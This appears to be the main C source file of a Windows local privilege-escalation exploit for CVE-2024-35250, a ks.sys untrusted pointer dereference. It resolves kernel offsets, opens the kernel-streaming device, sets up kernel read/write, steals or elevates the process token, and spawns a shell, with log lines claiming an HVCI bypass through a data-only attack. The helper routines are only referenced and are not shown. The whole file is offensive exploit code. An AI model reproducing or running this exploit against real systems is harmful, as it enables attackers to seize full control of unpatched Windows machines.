#include "common.h"
#include "exploit.h"
#include "offsets.h"
#include "device.h"
#include "leak.h"
#include "krw.h"
#include "token.h"

int exploit_run(void)
{
    EPROCESS_OFFSETS off;
    HANDLE hdev;
    KRW_CTX ctx;

    LOG_OK("cve-2024-35250 exploit");
    LOG_OK("ks.sys untrusted pointer dereference -> eop");
    LOG_WARN("hvci bypass via data-only attack");

    if (!resolve_offsets(&off)) {
        LOG_FAIL("unsupported os");
        return 1;
    }

    hdev = device_open_ks();
    if (hdev == INVALID_HANDLE_VALUE) {
        LOG_FAIL("device open failed");
        return 1;
    }
    LOG_OK("device handle: 0x%p", hdev);

    if (!krw_init(&ctx, hdev)) {
        LOG_FAIL("r/w init failed");
        device_close(hdev);
        return 1;
    }

    if (!token_elevate(&ctx, &off)) {
        LOG_FAIL("privilege escalation failed");
        krw_free(&ctx);
        device_close(hdev);
        return 1;
    }

    LOG_OK("escalation complete");
    token_spawn_shell();

    krw_free(&ctx);
    device_close(hdev);
    return 0;
}